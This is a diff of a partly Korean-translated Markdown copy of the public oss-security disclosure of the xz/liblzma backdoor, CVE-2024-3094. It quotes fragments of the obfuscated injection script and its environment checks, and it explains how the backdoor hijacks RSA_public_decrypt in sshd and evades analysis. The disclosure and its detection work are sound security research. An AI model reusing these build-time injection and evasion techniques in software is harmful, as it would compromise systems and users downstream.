@@ -1,3 +1,4 @@
+# Openwall post by Andres Freund
 날짜: 2024년 3월 29일 금요일 08:51:26 -0700  
 보낸 이: Andres Freund <andres@...razel.de>  
 받는 이: oss-security@...ts.openwall.com  
@@ -13,8 +14,9 @@ xz 레포지토리 제공부와 xz tarballs가 백도어로 쓰였습니다.
 
 처음에 저는 데비안 패키지의 손상이라 생각했으나, upstream의 문제로 밝혀졌습니다.
 
-<br>
-== 손상된 릴리즈 타르볼 ==
+---
+
+### == 손상된 릴리즈 타르볼 ==
 
 백도어의 한 부분은 *배포된 tarballs에만 있습니다*.  
 참고로 여기 데비안의 tarball을 임포트한 링크가 있는데, 이는 5.6.0과 5.6.1 tarballs에도 존재합니다.
@@ -24,13 +26,13 @@ xz 레포지토리 제공부와 xz tarballs가 백도어로 쓰였습니다.
 해당 라인은 제공부의 `build-to-host` 소스와 xz의 git에도 *없습니다.*  
 그러나 "소스 코드" 링크들을 제외하고, github가 레포지토리 컨텐츠로부터 직접 생성한 것으로 보이는 릴리즈된 upstream의 tarballs에는 존재하였습니다.
 
-- https://github.com/tukaani-project/xz/releases/tag/v5.6.0  
+- https://github.com/tukaani-project/xz/releases/tag/v5.6.0
 - https://github.com/tukaani-project/xz/releases/tag/v5.6.1
 
 이것은 구성의 말미에 실행될 난독화된 스크립트를 주입합니다.  
 이 스크립트는 레포지토리의 `test`에 있는 .xz파일들이고, 난독화 되어있습니다.
 
-이 스크립트는 실행되고, 몇 가지 선제조건과 일치하면 하부 코드
+이 스크립트는 실행되고나서, 몇 가지 선제조건과 일치하면 하단의 코드
 
 ```bash
 am__test = bad-3-corrupt_lzma2.xz
@@ -91,17 +93,19 @@ export i="((head -c +1024 >/dev/null) && head -c +2048
 ####World####
 ```
 
-난독화 해제 후 이는 injected.txt로 연결됩니다.
+난독화 해제 후 이는 첨부된 injected.txt로 나타납니다.(하단 링크 참조)
 
-<br>
-== 손상된 레포지토리 ==
+---
+
+### == 손상된 레포지토리 ==
 
 다수의 exploit을 보함한 upstream에서 커밋된 해당 파일들은 난독화된 형태를 띄고 있었습니다.
 
-- tests/files/bad-3-corrupt_lzma2.xz  
+- tests/files/bad-3-corrupt_lzma2.xz
 - tests/files/good-large_compressed.lzma
 
 이 파일들은 하단 커밋에 처음으로 추가되었습니다.  
+
 - https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0
 
 참고로 5.6.0 버전에서 저 파일들은 어떠한 "tests"에도 사용되지 않았습니다.
@@ -118,227 +122,225 @@ export i="((head -c +1024 >/dev/null) && head -c +2048
 
 - https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
 
-몇 주간 활동을 고려할 때, 커미터는 직접 연관이 있거나, 그들의 시스템에 상당히 심각한 손상이 있었을 것으로 보입니다.  
+몇 주간 활동을 고려할 때, 커미터는 직접 연관이 있거나, 그들의 시스템에 상당히 심각한 손상이 있었을 것으로 보입니다. 
+ 
 유감스럽게도 상단에 언급한 "수정 사항"에 관해 여러 리스트에서 소통한 것으로 보아, 후자의 경우일 가능성은 낮아보입니다.
 
 Florian Weimer께서 처음으로 주입된 코드를 따로 추출하셨습니다.  
 또한 liblzma_la-crc64.fast.o를 첨부해주셨습니다.  
 저는 그저 전체 바이너리만을 보면 됐습니다. 감사합니다!
 
-<br>
-== Affected Systems ==
+---
 
-The attached de-obfuscated script is invoked first after configure, where it
-decides whether to modify the build process to inject the code.
+### == 영향 받은 시스템 ==
+
+The attached de-obfuscated script is invoked first after configure, where it decides whether to modify the build process to inject the code.
 
 These conditions include targeting only x86-64 linux:
-    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+
+```bash
+if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) &&  
+(echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+```
 
 Building with gcc and the gnu linker
-    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
-    exit 0
-    fi
-    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
-    exit 0
-    fi
-    LDv=$LD" -v"
-    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
-    exit 0
+
+```bash
+if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+exit 0
+fi
+if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+exit 0
+fi
+LDv=$LD" -v"
+if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+exit 0
+```
 
 Running as part of a debian or RPM package build:
-    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
 
-Particularly the latter is likely aimed at making it harder to reproduce the
-issue for investigators.
+```bash
+if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+```
 
+Particularly the latter is likely aimed at making it harder to reproduce the issue for investigators.
 
-Due to the working of the injected code (see below), it is likely the backdoor
-can only work on glibc based systems.
+Due to the working of the injected code (see below), it is likely the backdoor can only work on glibc based systems.
 
+Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux distributions, and where they have, mostly in pre-release versions.
 
-Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
-distributions, and where they have, mostly in pre-release versions.
+---
 
-
-== Observing Impact on openssh server ==
+### == Observing Impact on openssh server ==
 
 With the backdoored liblzma installed, logins via ssh become a lot slower.
 
+```bash
 time ssh nonexistant@...alhost
+```
 
 before:
+```bash
 nonexistant@...alhost: Permission denied (publickey).
 
-before:
 real	0m0.299s
 user	0m0.202s
 sys	0m0.006s
+```
 
 after:
+```bash
 nonexistant@...alhost: Permission denied (publickey).
 
 real	0m0.807s
 user	0m0.202s
 sys	0m0.006s
+```
 
+openssh does not directly use liblzma.  
+However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma.
 
-openssh does not directly use liblzma. However debian and several other
-distributions patch openssh to support systemd notification, and libsystemd
-does depend on lzma.
+Initially starting `sshd` outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked.  
+This appears to be part of some countermeasures to make analysis harder.
 
+Observed requirements for the exploit:  
+a) TERM environment variable is not set  
+b) `argv[0]` needs to be `/usr/sbin/sshd`  
+c) `LD_DEBUG`, `LD_PROFILE` are not set  
+d) `LANG` needs to be set  
+e) Some debugging environments, like rr, appear to be detected. Plain gdb appears to be detected in some situations, but not others
 
-Initially starting sshd outside of systemd did not show the slowdown, despite
-the backdoor briefly getting invoked. This appears to be part of some
-countermeasures to make analysis harder.
+To reproduce outside of systemd, the server can be started with a clear environment, setting only the required variable:
 
-Observed requirements for the exploit:
-a) TERM environment variable is not set
-b) argv[0] needs to be /usr/sbin/sshd
-c) LD_DEBUG, LD_PROFILE are not set
-d) LANG needs to be set
-e) Some debugging environments, like rr, appear to be detected. Plain gdb
-   appears to be detected in some situations, but not others
-
-To reproduce outside of systemd, the server can be started with a clear
-environment, setting only the required variable:
-
+```bash
 env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
+```
 
-
-In fact, openssh does not need to be started as a server to observe the
-slowdown:
+In fact, openssh does not need to be started as a server to observe the slowdown:
 
 slow:
+```bash
 env -i LANG=C /usr/sbin/sshd -h
-
+```
 (about 0.5s on my older system)
 
 
 fast:
+```bash
 env -i LANG=C TERM=foo /usr/sbin/sshd -h
 env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
 ...
-
+```
 (about 0.01s on the same system)
 
 
-It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
-are obviously lots of servers linking to libsystemd.
+It's possible that `argv[0]` other `/usr/sbin/sshd` also would have effect - there are obviously lots of servers linking to libsystemd.
 
+---
 
-== Analyzing the injected code ==
+### == Analyzing the injected code ==
 
-I am *not* a security researcher, nor a reverse engineer.  There's lots of
-stuff I have not analyzed and most of what I observed is purely from
-observation rather than exhaustively analyzing the backdoor code.
+I am *not* a security researcher, nor a reverse engineer.  There's lots of stuff I have not analyzed and most of what I observed is purely from observation rather than exhaustively analyzing the backdoor code.
 
-To analyze I primarily used "perf record -e intel_pt//ub" to observe where
-execution diverges between the backdoor being active and not. Then also gdb,
-setting breakpoints before the divergence.
+To analyze I primarily used `perf record -e intel_pt//ub` to observe where execution diverges between the backdoor being active and not. Then also gdb, setting breakpoints before the divergence.
 
+The backdoor initially intercepts execution by replacing the ifunc resolvers `crc32_resolve()`, `crc64_resolve()` with different code, which calls `_get_cpuid()`, injected into the code (which previously would just be static inline functions).  
+In xz 5.6.1 the backdoor was further obfuscated, removing symbol names.
 
-The backdoor initially intercepts execution by replacing the ifunc resolvers
-crc32_resolve(), crc64_resolve() with different code, which calls
-_get_cpuid(), injected into the code (which previously would just be static
-inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
-symbol names.
+These functions get resolved during startup, because `sshd` is built with `-Wl`, `-z` , `now`, leading to all symbols being resolved early.
+If started with `LD_BIND_NOT=1` the backdoor does not appear to work.
 
-These functions get resolved during startup, because sshd is built with
--Wl,-z,now, leading to all symbols being resolved early. If started with
-LD_BIND_NOT=1 the backdoor does not appear to work.
+Below `crc32_resolve()` `_get_cpuid()` does not do much, it just sees that a 'completed' variable is 0 and increments it, returning the normal cpuid result (via a new `_cpuid()`).  
+It gets to be more interesting during `crc64_resolve()`.
 
+In the second invocation `crc64_resolve()` appears to find various information, like data from the dynamic linker, program arguments and environment.  
+Then it perform various environment checks, including those above.  
+There are other checks I have not fully traced.
 
-Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
-'completed' variable is 0 and increments it, returning the normal cpuid result
-(via a new _cpuid()). It gets to be more interesting during crc64_resolve().
+If the above decides to continue, the code appears to be parsing the symbol tables in memory.  
+This is the quite slow step that made me look into the issue.
 
-In the second invocation crc64_resolve() appears to find various information,
-like data from the dynamic linker, program arguments and environment. Then it
-perform various environment checks, including those above. There are other
-checks I have not fully traced.
+Notably `liblzma`'s symbols are resolved before many of the other libraries, including the symbols in the main `sshd` binary.  
+This is important because symbols are resolved, the `GOT` gets remapped read-only thanks to `-Wl`, `-z`, `relro`.
 
-If the above decides to continue, the code appears to be parsing the symbol
-tables in memory. This is the quite slow step that made me look into the issue.
+To be able to resolve symbols in libraries that have not yet loaded, the backdoor installs an audit hook into the dynamic linker, which can be observed with gdb using
 
+```bash
+watch _rtld_global_ro._dl_naudit
+```
 
-Notably liblzma's symbols are resolved before many of the other libraries,
-including the symbols in the main sshd binary.  This is important because
-symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
-
-
-To be able to resolve symbols in libraries that have not yet loaded, the
-backdoor installs an audit hook into the dynamic linker, which can be observed
-with gdb using
-  watch _rtld_global_ro._dl_naudit
 It looks like the audit hook is only installed for the main binary.
 
-That hook gets called, from _dl_audit_symbind, for numerous symbols in the
-main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
-resolved.  When called for that symbol, the backdoor changes the value of
-RSA_public_decrypt@....plt to point to its own code.  It does not do this via
-the audit hook mechanism, but outside of it.
+That hook gets called, from `_dl_audit_symbind`, for numerous symbols in the main binary.  
+It appears to wait for `RSA_public_decrypt@....plt` to be
+resolved.  
+When called for that symbol, the backdoor changes the value of
+`RSA_public_decrypt@....plt` to point to its own code.  
+It does not do this via the audit hook mechanism, but outside of it.
 
-For reasons I do not yet understand, it does change sym.st_value *and* the
-return value of from the audit hook to a different value, which leads
-_dl_audit_symbind() to do nothing - why change anything at all then?
+For reasons I do not yet understand, it does change `sym.st_value` *and* the return value of from the audit hook to a different value, which leads `_dl_audit_symbind()` to do nothing - why change anything at all then?
 
 After that the audit hook is uninstalled again.
 
-It is possible to change the got.plt contents at this stage because it has not
-(and can't yet) been remapped to be read-only.
-
+It is possible to change the `got.plt` contents at this stage because it has not (and can't yet) been remapped to be read-only.
 
 I suspect there might be further changes performed at this stage.
 
+---
 
-== Impact on sshd ==
+### == Impact on sshd ==
 
-The prior section explains that RSA_public_decrypt@....plt was redirected to
-point into the backdoor code. The trace I was analyzing indeed shows that
-during a pubkey login the exploit code is invoked:
+The prior section explains that `RSA_public_decrypt@....plt` was redirected to point into the backdoor code.  
+The trace I was analyzing indeed shows that during a pubkey login the exploit code is invoked:
 
-            sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
+```bash
+sshd 1736357 [010] 714318.734008:
+1  branches:uH:
+5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>
+5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
+```
 
-The backdoor then calls back into libcrypto, presumably to perform normal authentication
+The backdoor then calls back into `libcrypto`, presumably to perform normal authentication
+```bash
+sshd 1736357 [010] 714318.734009:
+1  branches:uH:
+7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>
+7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
+```
 
-            sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
-
-
-I have not yet analyzed precisely what is being checked for in the injected
-code, to allow unauthorized access. Since this is running in a
-pre-authentication context, it seems likely to allow some form of access or
-other form of remote code execution.
+I have not yet analyzed precisely what is being checked for in the injected code, to allow unauthorized access.  
+Since this is running in a pre-authentication context, it seems likely to allow some form of access or other form of remote code execution.
 
 I'd upgrade any potentially vulnerable system ASAP.
 
+---
 
-== Bug reports ==
+### == Bug reports ==
 
-Given the apparent upstream involvement I have not reported an upstream
-bug. As I initially thought it was a debian specific issue, I sent a more
-preliminary report to security@...ian.org.  Subsequently I reported the issue
-to distros@. CISA was notified by a distribution.
+Given the apparent upstream involvement I have not reported an upstream bug.  
+As I initially thought it was a debian specific issue, I sent a more preliminary report to security@...ian.org.  
+Subsequently I reported the issue to distros@.  
+CISA was notified by a distribution.
 
 Red Hat assigned this issue CVE-2024-3094.
 
+---
 
-== Detecting if installation is vulnerable ==
+### == Detecting if installation is vulnerable ==
 
-Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
-system is vulnerable, attached here. Thanks!
+Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a system is vulnerable, attached here. Thanks!
 
+---
 
 Greetings,
 
 Andres Freund
 
-View attachment "injected.txt" of type "text/plain" (8236 bytes)
+View attachment "[injected.txt](https://www.openwall.com/lists/oss-security/2024/03/29/4/1)" of type "text/plain" (8236 bytes)
 
-Download attachment "liblzma_la-crc64-fast.o.gz" of type "application/gzip" (36487 bytes)
+Download attachment "[liblzma_la-crc64-fast.o.gz](https://www.openwall.com/lists/oss-security/2024/03/29/4/2)" of type "application/gzip" (36487 bytes)
 
-Download attachment "detect.sh" of type "application/x-sh" (426 bytes)
-Powered by blists - more mailing lists
+Download attachment "[detect.sh](https://www.openwall.com/lists/oss-security/2024/03/29/4/3)" of type "application/x-sh" (426 bytes)
 
-Please check out the Open Source Software Security Wiki, which is counterpart to this mailing list.
-
-Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.
+---
+[Go To Top ↑](#openwall-post-by-andres-freund)
